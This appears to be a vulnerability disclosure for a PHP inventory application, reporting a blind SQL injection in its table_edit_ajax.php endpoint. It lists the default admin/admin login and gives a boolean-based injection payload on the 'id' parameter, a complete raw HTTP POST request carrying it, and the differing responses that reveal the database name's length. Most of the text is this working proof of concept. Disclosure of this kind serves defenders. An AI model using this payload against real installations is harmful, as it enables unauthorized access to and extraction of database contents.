# Simple Inventory System v1.0 by argie has SQL injection

The password for the backend login account is: admin/admin

vendors: https://www.sourcecodester.com/php/4481/simple-inventory-system-using-phpmysql.html

Vulnerability File: /inventory/table_edit_ajax.php

Vulnerability location: /inventory/table_edit_ajax.php

[+] Payload: id=6' and length(database()) =8--+&price=1&qty_sold=111 // Leak place ---> id

Current database name: liveedit,length is 8

```sql
POST /inventory/table_edit_ajax.php HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
Referer: http://192.168.1.19/inventory/tableedit.php
Content-Length: 55
Cookie: PHPSESSID=4udcglaaucdqgpdolfhsjerl4q
Connection: close

id=6' and length(database()) =8--+&price=1&qty_sold=111
```

When length (database (()) = 7, Content-Length: 4;location: index.php
![image](https://user-images.githubusercontent.com/54017627/169198088-320ef61a-4072-4718-83a2-9988f39a8840.png)

When length (database (()) = 8, Content-Length: 4;location: tableedit.php

![image](https://user-images.githubusercontent.com/54017627/169198056-11a6e2ba-a810-4c40-97df-1e8cbb9dc852.png)


